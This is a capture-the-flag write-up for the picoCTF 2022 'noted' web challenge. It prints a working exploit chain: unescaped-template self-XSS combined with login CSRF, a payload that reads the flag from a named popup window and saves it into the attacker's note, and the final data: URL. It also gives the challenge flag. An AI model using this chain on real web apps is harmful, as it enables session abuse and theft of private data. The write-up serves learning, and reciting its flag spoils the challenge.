# Web - Noted
This was a hard web challenge that I solved during picoCTF 2022. 

noted - 500 points
Category: Web Exploitation
I made a nice web app that lets you take notes. I'm pretty sure I've followed all the best practices so its definitely secure right? Note that the headless browser used for the "report" feature does **not** have access to the internet.
Create an account at `<instance url>`.
Source code: [noted.tar.gz](https://artifacts.picoctf.net/c/286/noted.tar.gz)
Hints:
- Are you _sure_ I followed all the best practices?
- There's more than just HTTP(S)!
- Things that require user interaction normally in Chrome might not require it in Headless Chrome.

## Source Code Analysis
The app is a Node.JS web application using the fastify framework. It uses a signed sessions plugin (`fastify-secure-session`), a CSRF prevention plugin (`fastify-csrf`), and the EJS templating library. It uses an SQLite database to store data and argon2 to hash passwords. The app allows users to login, register, and create and delete notes. Notes can only be viewed by their authors. 

There is also a report endpoint that opens a headless chrome browser that registers while a random username and password, then creates a note with the flag inside. Finally, it visits the "reported" link of the user's choice. This tells us that the objective of the challenge is some sort of client-side exploit on the headless browser to steal the flag. 

One thing that immediately jumps out is the use of the non-escaped template tags, `<%-` on the note title and content, creating an XSS vulnerability:
![[Pasted image 20220327144004.png]]
![[Pasted image 20220327144036.png]]

This must be what the first hint was referencing. 

However, this vulnerability is only self-XSS as there is no way to view another user's notes. Self-XSS made me think of a liveoverflow video I once watched a while ago - [XSS on the Wrong Domain T_T - Tech Support (web) Google CTF 2020](https://youtu.be/9ecv6ILXrZo).

In the video, liveoverflow explains how his team solved a similar challenge that had a self-XSS vulnerability by loading the flag into an iframe, then logging the user into an attacker-controlled acount in another iframe to trigger the self-XSS. The iframe preserves the flag even after the flag user is logged out, and the self-XSS payload can then communicate with the flag iframe. This is allowed since the flag and the XSS are the same domain. 

This sounds applicable to this challenge, so I tried to implement it. 

First, we must get around the fact that the bot will not be connected to the internet. What URL can we host our payload on? I thought of using a `data:text/html,` URL because it doesn't require internet and functions similarly to any other page. This must be what the second hint was referencing. 

Here is a simple test, creating an iframe of the challenge site: `data:text/html,<body><script>i=document.createElement("iframe");i.src="http://instance.url";document.body.appendChild(i)</script>`
It works:
![[Pasted image 20220327145926.png]]

Now we can continue with the exploit development. I will do my exploit normally, with a local webserver and separate JS file, as this is much easier, and I can convert it into a `data:` URL later.

In liveoverflow's video, he is able to log into the XSS user by directly setting the cookies, but since `/login` route does not have CSRF protection enabled, we can log in with an automatically submitted HTML form to log in to the attacker. 

Here is a proof of concept script that I wrote:

```js
const instance = "http://instance.url";
// The XSS user needs to have a note with the XSS payload
const xssUser = { username: "b", password: "b" };

function awaitOnload(elt) {
  return new Promise((res) => (elt.onload = () => res(elt)));
}

function loadFrame(url, name) {
  const frame = document.createElement("iframe");
  frame.name = name;
  frame.src = url;
  const r = awaitOnload(frame);
  document.body.appendChild(frame);
  return r;
}

function createForm(method, action) {
  const form = document.createElement("form");
  form.method = method;
  form.action = action;
  return form;
}

function createFormInput(form, name, value) {
  const input = document.createElement("input");
  input.type = "hidden";
  input.name = name;
  input.value = value;
  form.appendChild(input);
}

function sleep(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

(async function () {
  const flagFrame = await loadFrame(instance + "/notes", "flag");
  const xssFrame = await loadFrame("about:blank", "xss");
  const form = createForm("POST", instance + "/login");
  createFormInput(form, "username", xssUser.username);
  createFormInput(form, "password", xssUser.password);
  form.target = xssFrame.name;
  document.body.appendChild(form);
  form.submit();
})();
```

I hosted it locally with `python3 -m http.server 9090`, and a HTML file like:
```html
<!DOCTYPE html>
<body>
<script src="xss.js"></script>
</body>
```

There's a few convenience functions, but the real exploit is at the bottom. We load the flag user's notes into a frame, then we create a POST form that logs in our XSS user. 

I learned about the [form element's `target` attribute](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/target), which causes the form to be submitted into an iframe. This is crucial because otherwise our page with the flag iframe would be navigated away from when the login happens. 

Next we need to create the payload for the XSS user. I loaded up my PoC script (which doesn't work since our XSS user doesn't exist yet) and used Firefox's developer tool to change my JS console to be in the context of the XSS frame. Next, I used a similar trick to liveoverflow's video to get the flag from the flag frame. I used the `window.parent` property to get back to the main window, then I used the `frames` property on that window to access the flag frame, and it worked:
![[Pasted image 20220327152209.png]]

Next, I created a quick script to exfiltrate that flag by creating a new note. Since our XSS payload in the noted app's domain, we don't have to worry about CORS restrictions. 
```html
<script>(async function xssPayload() {
  const flag = window.parent.frames["flag"].document.body.innerText;
  const tokenReq = await fetch("/new");
  const tokenHTML = await tokenReq.text();
  const token = /name="_csrf" value="(.+?)"/g.exec(tokenHTML)[1];
  const noteReq = await fetch("/new", {
    method: "POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body:
      `_csrf=${encodeURIComponent(token)}` +
      `&title=flag&content=${encodeURIComponent(flag)}`,
  });
})()</script>
```
Finally, I created an account with a fake flag in it and created the XSS user in a private window. Testing the exploit, it works:
![[Pasted image 20220327152631.png]]

Now, all I had to do was submit. To convert my exploit into a data URL, I used [an online JS minifier](https://skalman.github.io/UglifyJS-online/) to put it all on one line, then wrapped it in `data:text/html,<body><script></script>`. Initially it was above the length limit but by removing my debug console logs, it was short enough to be reported. I reported the URL, crossed my fingers, and, ...., nothing. 

My exploit worked in Firefox. Pasting the `data:` URL into the browser with everything set up right worked, but reporting it didn't. I eventually ran the bundle app locally but with headless disabled on the browser. This told me why my exploit didn't work. On chrome, the flag iframe was just a completely blank login page!
![[Pasted image 20220327153416.png]]

Looking into the console, I could see that my exploit was being blocked by SameSite policy. This policy meant that when iframes were loaded, their third-party cookies would not be sent, meaning that I would need to rethink my exploit. 

I was stuck at this stage for quite a while. Eventually, I googled for `csrf site:ctftime.org` to try and look at writeups for similar challenges, hoping to get some inspiration. I came across [this writeup](https://ctftime.org/writeup/30882) which was very similar to this challenge, with self-XSS and even the structure of a notes app. In this writeup, they were also unable to use iframes, but for a different reason: they were blocked via `X-Frame-Options`. 

They solved this by using new windows. Instead of loading the flag into an iframe, it is loaded into a new window. Next, the page is navigated to the XSS payload, which can read the flag from the opened window. 

I learned that what makes this possible is the second parameter to [`window.open`](https://developer.mozilla.org/en-US/docs/Web/API/Window/open) was [the target parameter](https://developer.mozilla.org/en-US/docs/Web/API/Window/open#parameters), which names the window, similar to the way the iframes were named in the previous version of the exploit. If you then call `window.open` again after navigating the page, with a blank URL and the same target parameter, you can get back a reference to the already open window. 

This must be what the third hint is referring to, because normally the pop-up blocker requires user interaction to open a window, but headless chrome doesn't. 

I then tried to apply this same method to my exploit script. I changed the bottom to open a new window with the target of `flag`, wait a bit to let the flag load, then login to trigger the XSS payload:
```js
(async function () {
  const form = createForm("POST", instance + "/login");
  createFormInput(form, "username", xssUser.username);
  createFormInput(form, "password", xssUser.password);
  document.body.appendChild(form);

  await sleep(1000);
  window.open(instance + "/notes", "flag");
  await sleep(3000);
  form.submit();
});
```

Then, I modified the flag getting line of the XSS payload to grab the flag from the open window:
```js
const flag = window.open("", "flag").document.body.innerText;
```

Putting it all together, here is the final XSS payload:
```html
<script>(async function xssPayload() {
  const flag = window.open("", "flag").document.body.innerText;
  const tokenReq = await fetch("/new");
  const tokenHTML = await tokenReq.text();
  const token = /name="_csrf" value="(.+?)"/g.exec(tokenHTML)[1];
  await fetch("/new", {
    method: "POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body:
      `_csrf=${encodeURIComponent(token)}` +
      `&title=flag&content=${encodeURIComponent(flag)}`,
  });
})()</script>
```

One last trick. You have to set the instance URL to be `0.0.0.0:8080` (or some other variation on lcoalhost) for the exploit to work. That being said, heres the final URL to report:
`data:text/html,<body><script>const instance="http://0.0.0.0:8080",xssUser={username:"b",password:"b"};function awaitOnload(e){return new Promise(n=>e.onload=(()=>n(e)))}function loadFrame(e,n){const t=document.createElement("iframe");t.name=n,t.src=e;const o=awaitOnload(t);return document.body.appendChild(t),o}function createForm(e,n){const t=document.createElement("form");return t.method=e,t.action=n,t}function createFormInput(e,n,t){const o=document.createElement("input");o.type="hidden",o.name=n,o.value=t,e.appendChild(o)}function sleep(e){return new Promise(n=>setTimeout(n,e))}!async function(){const e=createForm("POST",instance+"/login");createFormInput(e,"username",xssUser.username),createFormInput(e,"password",xssUser.password),document.body.appendChild(e),await sleep(1e3),window.open(instance+"/notes","flag"),await sleep(3e3),e.submit()}();</script>`

And this gives us the flag:
![[Pasted image 20220327160707.png]]

Flag: `picoCTF{p00rth0s_parl1ment_0f_p3p3gas_386f0184}`
